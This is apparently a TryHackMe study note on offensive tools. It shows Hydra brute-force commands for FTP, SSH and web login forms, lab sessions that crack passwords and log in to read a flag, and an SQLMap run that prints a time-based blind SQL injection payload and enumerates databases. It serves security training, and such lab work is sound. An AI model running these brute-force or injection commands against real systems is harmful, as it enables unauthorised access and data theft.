---
title: "offensivetools"
quote: tryhackme
categories:
  - 技术
  - 教程
tags: [Markdown, web]
description: Offensive Security Tools
draft: false
sidebar: false
outline: deep
---

# Offensive Security Tools

## Hydra

Hydra is a brute force online password cracking program, a quick system login password “hacking” tool.

Hydra is a free and open-source password-cracking tool. It can try numerous passwords till the correct password is found. It can be used to crack passwords for various network services, including SSH, Telnet, FTP, and HTTP.

According to its [official repository](https://github.com/vanhauser-thc/thc-hydra), Hydra supports, i.e., has the ability to brute force the following protocols: “Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, Radmin, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, TeamSpeak (TS2), Telnet, VMware-Auth, VNC and XMPP.”

### Hydra Commands

The options we pass into Hydra depend on which service (protocol) we’re attacking. For example, if we wanted to brute force FTP with the username being `user` and a password list being `passlist.txt`, we’d use the following command:

```bash
hydra -l user -P passlist.txt ftp://10.10.184.147
```
**example:**

```bash
hydra -l joshua -P /usr/share/wordlists/fasttrack.txt 10.10.69.251 ssh
```

<span style="font-size: 23px;">**SSH**</span>

here are the commands to use Hydra on SSH and a web form (POST method).

`hydra -l <username> -P <full path to pass> 10.10.184.147 -t 4 ssh`

| Option | Description |
| :---: | :---------: |
| -l  | specifies the (SSH) username for login |
| -P  | indicates a list of passwords |
| -t  | sets the number of threads to spawn |

For example,
```bash
 hydra -l root -P passwords.txt 10.10.184.147 -t 4 ssh
```
- Hydra will use `root` as the username for `ssh`
- It will try the passwords in the `passwords.txt` file
- There will be four threads running in parallel as indicated by `-t 4`

<span style="font-size: 23px;">**Post Web Form**</span>

We can use Hydra to brute force web forms too. You must know which type of request it is making; GET or POST methods are commonly used. You can use your browser’s network tab (in developer tools) to see the request types or view the source code.

`sudo hydra <username> <wordlist> 10.10.184.147 http-post-form "<path>:<login_credentials>:<invalid_response>"`

| Option | Description |
| ------ | ----------- |
| `-l` | the username for (web form) login |
| `-P` | the password list to use |
| `http-post-form` | the type of the form is POST |
| `<path>` | the login page URL, for example, `login.php` |
| `<login_credentials>` | the username and password used to log in, for example, `username=^USER\^&password=^PASS^` |
| `<invalid_response>` | part of the response when the login fails |
| `-V` | verbose output for every attempt | 

Below is a more concrete example Hydra command to brute force a POST login form:

```bash
hydra -l <username> -P <wordlist> 10.10.184.147 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```
- The login page is only `/`, i.e., the main IP address.
- The `username` is the form field where the username is entered
- The specified username(s) will replace `^USER^`
- The `password` is the form field where the password is entered
- The provided passwords will be replacing `^PASS^`
- Finally, `F=incorrect` is a string that appears in the server reply when the login fails

example

```bash
hydra -L /usr/share/wordlists/rockyou.txt -p password -s 80 -f 10.10.105.77 http-post-form "/:username=^USER^&password=^PASS^:Invalid username and password."
```

<span style="font-size: 23px;">**Q&A**</span>

Use Hydra to bruteforce molly's web password. What is flag 1?
```bash
# step1 find rockyou.txt
root@ip-10-10-223-226:~# find / -type f -name "rockyou.txt" 2>/dev/null
/root/Desktop/rockyou.txt
/usr/share/wordlists/rockyou.txt

# step2 hydra
root@ip-10-10-223-226:~# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.184.147 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-29 02:38:59
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://10.10.184.147:80/login:username=^USER^&password=^PASS^:F=incorrect
[ATTEMPT] target 10.10.184.147 - login "molly" - pass "123456" - 1 of 14344398 [child 0] (0/0)
...
80][http-post-form] host: 10.10.184.147   login: molly   password: sunshine
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-29 02:39:12
```
Use Hydra to bruteforce molly's SSH password. What is flag 2?
```bash
# step1 nmap
root@ip-10-10-223-226:~# sudo nmap -sS -sV 10.10.184.147
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-29 02:46 BST
Nmap scan report for 10.10.184.147
Host is up (0.00014s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Node.js Express framework
MAC Address: 02:26:CA:D3:DC:C9 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.83 seconds

# step2 hydra
root@ip-10-10-223-226:~# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.184.147 -t 4 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-29 02:52:02
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
[DATA] attacking ssh://10.10.184.147:22/
[22][ssh] host: 10.10.184.147   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-29 02:52:58
root@ip-10-10-223-226:~# ssh molly@10.10.184.147
# step3 login
molly@ip-10-10-184-147:~$ ls
flag2.txt
molly@ip-10-10-184-147:~$ cat flag2.txt 
THM{c8eeb0468febbadea859baeb33b2541b}

```
---

## SQLMap

SQLMap is a free and open-source penetration testing tool that automates finding and exploiting SQL injection vulnerabilities on web applications. It can extract data from databases, execute commands on the underlying operating system, and even take control of the target server.

**Options**

- `--wizard` guide you through each step and ask questions to complete the scan
- `-u` Target URL (e.g. "http://www.site.com/vuln.php?id=1")
- `--dbs` helps you to extract all the database names
- `-D database_name --tables` extract information about the tables of that database 
- `-D database_name -T table_name --dump` enumerate the records in those tables
- `--level=5` add --level=5 at the end of your commands to perform the in-depth scans

<span style="font-size: 23px;">**Practice**</span>

```bash
root@ip-10-10-45-100:~# sqlmap -u 'http://10.10.10.205/ai/includes/user_login?email=test&password=test' --dbs --level=5
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.4#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:59:26 /2025-05-31/

[07:59:26] [INFO] resuming back-end DBMS 'mysql' 
[07:59:26] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test' AND (SELECT 9921 FROM (SELECT(SLEEP(5)))nKnq) AND 'AlNM'='AlNM&password=test
---
[07:59:26] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[07:59:26] [INFO] fetching database names
[07:59:26] [INFO] fetching number of databases
[07:59:26] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                           
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[07:59:39] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[07:59:59] [INFO] adjusting time delay to 1 second due to good response times
6
[07:59:59] [INFO] retrieved: information_schema
[08:01:54] [INFO] retrieved: ai
[08:02:03] [INFO] retrieved: mysql
[08:02:35] [INFO] retrieved: performance_schema
[08:04:27] [INFO] retrieved: phpmyadmin
[08:05:36] [INFO] retrieved: test
available databases [6]:
[*] ai
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] test

[08:06:04] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.205'
[08:06:04] [WARNING] you haven't updated sqlmap for more than 1884 days!!!

[*] ending @ 08:06:04 /2025-05-31/

```
